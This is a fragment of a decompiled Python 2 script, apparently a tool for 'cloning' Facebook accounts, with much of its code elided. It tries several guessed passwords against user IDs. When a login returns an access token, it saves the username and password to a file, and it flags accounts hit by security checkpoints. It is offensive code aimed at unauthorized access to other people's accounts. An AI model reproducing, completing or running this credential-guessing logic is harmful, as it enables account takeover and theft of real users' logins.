# coding: utf-8
# Decompiled By DIPchodex
# Github : https://github.com/TH3-FUCK3R
# uncompyle6 version 
# Code written By Farhan Khan


import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
__author__ = 'DIP'
__copyright = 'All rights reserved . Copyright Farhan Khan'
CorrectUsername = 'Dip@19900'
os.system('clear')
loop = 'true'
while (loop == 'true'):
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[92m  [DIP-OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/OK.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m  [DIP-CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m  [DIP-OK] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m  [DIP-OK]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/OK.txt', 'a')
    ...
    print(47*"-")
    print 'Cloned Accounts Has Been Saved : /sdcard/cloned.txt'
    jalan('Note : Cp account  10 say 12 days BAD OPEN KRY')
    raw_input('\n\x1b[1;95m[\x1b[1;98mDIPchod_menu_Back\x1b[1;95m]')
    login()
